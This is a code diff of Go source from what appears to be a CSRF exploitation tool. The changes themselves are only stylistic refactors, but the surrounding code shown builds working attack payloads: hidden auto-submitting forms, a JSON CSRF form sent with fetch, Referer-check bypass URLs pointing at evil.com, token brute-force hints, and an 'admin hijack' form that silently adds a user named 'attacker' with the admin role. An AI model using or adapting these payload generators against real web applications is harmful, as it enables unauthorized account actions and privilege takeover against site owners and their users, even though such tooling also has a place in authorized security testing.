@@ -134,13 +134,13 @@ func (e *Engine) generateBypassPayload(token CSRFToken, techniques []string) str
 	for _, technique := range techniques {
 		switch technique {
 		case "bruteforce":
-			payload.WriteString(fmt.Sprintf("<!-- Try common values for %s: 000000, 123456, admin, test -->\n", token.Name))
+			fmt.Fprintf(&payload, "<!-- Try common values for %s: 000000, 123456, admin, test -->\n", token.Name)
 		case "sequential":
-			payload.WriteString(fmt.Sprintf("<!-- Sequential token detected, try incrementing from %s -->\n", token.Value))
+			fmt.Fprintf(&payload, "<!-- Sequential token detected, try incrementing from %s -->\n", token.Value)
 		case "short_token":
-			payload.WriteString(fmt.Sprintf("<!-- Short token length=%d, bruteforce feasible -->\n", token.Length))
+			fmt.Fprintf(&payload, "<!-- Short token length=%d, bruteforce feasible -->\n", token.Length)
 		case "predictable_hex":
-			payload.WriteString(fmt.Sprintf("<!-- Hex token with %d chars, 16^%d possibilities -->\n", token.Length, token.Length))
+			fmt.Fprintf(&payload, "<!-- Hex token with %d chars, 16^%d possibilities -->\n", token.Length, token.Length)
 		case "base64_decode":
 			payload.WriteString("<!-- Base64 token may contain encoded data -->\n")
 		}
@@ -173,7 +173,7 @@ func (e *Engine) generateRefererBypasses(domains []string) []string {
 		bypasses = append(bypasses, fmt.Sprintf("https://%s@evil.com", domain))
 		bypasses = append(bypasses, fmt.Sprintf("https://evil.com#%s", domain))
 		bypasses = append(bypasses, fmt.Sprintf("https://evil.com/%s", domain))
-		bypasses = append(bypasses, fmt.Sprintf("https://%s.evil.com", strings.Replace(domain, ".", "-", -1)))
+		bypasses = append(bypasses, fmt.Sprintf("https://%s.evil.com", strings.ReplaceAll(domain, ".", "-")))
 		bypasses = append(bypasses, fmt.Sprintf("data:text/html,<script>location='https://%s'</script>", domain))
 	}
 
@@ -253,7 +253,7 @@ func (e *Engine) buildJSONCSRFPayload(url string, body map[string]string) string
 	payload.WriteString("\" enctype=\"text/plain\">\n")
 
 	for key, val := range body {
-		payload.WriteString(fmt.Sprintf("  <input type=\"hidden\" name='%s' value='%s' />\n", key, val))
+		fmt.Fprintf(&payload, "  <input type=\"hidden\" name='%s' value='%s' />\n", key, val)
 	}
 
 	payload.WriteString("  <input type=\"submit\" value=\"Submit\" />\n")
@@ -262,7 +262,7 @@ func (e *Engine) buildJSONCSRFPayload(url string, body map[string]string) string
 	payload.WriteString("document.forms[0].onsubmit = function() {\n")
 	payload.WriteString("  var data = {};\n")
 	for key := range body {
-		payload.WriteString(fmt.Sprintf("  data['%s'] = this.elements['%s'].value;\n", key, key))
+		fmt.Fprintf(&payload, "  data['%s'] = this.elements['%s'].value;\n", key, key)
 	}
 	payload.WriteString("  fetch(this.action, {method:'POST', body:JSON.stringify(data), headers:{'Content-Type':'application/json'}});\n")
 	payload.WriteString("  return false;\n")
@@ -298,11 +298,11 @@ func (e *Engine) buildAdminHijackPayload(targetURL, token string) string {
 	payload.WriteString(url.QueryEscape(token))
 	payload.WriteString("\" style=\"display:none\" />\n")
 
-	payload.WriteString(fmt.Sprintf("<form id=\"csrf\" method=\"POST\" action=\"%s\" style=\"display:none\">\n", targetURL))
+	fmt.Fprintf(&payload, "<form id=\"csrf\" method=\"POST\" action=\"%s\" style=\"display:none\">\n", targetURL)
 	payload.WriteString("  <input type=\"hidden\" name=\"action\" value=\"add_user\" />\n")
 	payload.WriteString("  <input type=\"hidden\" name=\"user\" value=\"attacker\" />\n")
 	payload.WriteString("  <input type=\"hidden\" name=\"role\" value=\"admin\" />\n")
-	payload.WriteString(fmt.Sprintf("  <input type=\"hidden\" name=\"token\" value=\"%s\" />\n", token))
+	fmt.Fprintf(&payload, "  <input type=\"hidden\" name=\"token\" value=\"%s\" />\n", token)
 	payload.WriteString("</form>\n")
 	payload.WriteString("<script>document.getElementById('csrf').submit();</script>")
 
@@ -312,10 +312,10 @@ func (e *Engine) buildAdminHijackPayload(targetURL, token string) string {
 func (e *Engine) GenerateCSRFHTML(targetURL string, method string, params map[string]string) string {
 	var html strings.Builder
 
-	html.WriteString(fmt.Sprintf("<html><body><form id=\"csrf\" method=\"%s\" action=\"%s\">\n", strings.ToUpper(method), targetURL))
+	fmt.Fprintf(&html, "<html><body><form id=\"csrf\" method=\"%s\" action=\"%s\">\n", strings.ToUpper(method), targetURL)
 
 	for key, val := range params {
-		html.WriteString(fmt.Sprintf("  <input type=\"hidden\" name=\"%s\" value=\"%s\" />\n", key, val))
+		fmt.Fprintf(&html, "  <input type=\"hidden\" name=\"%s\" value=\"%s\" />\n", key, val)
 	}
 
 	html.WriteString("  <input type=\"submit\" value=\"Click here\" />\n")
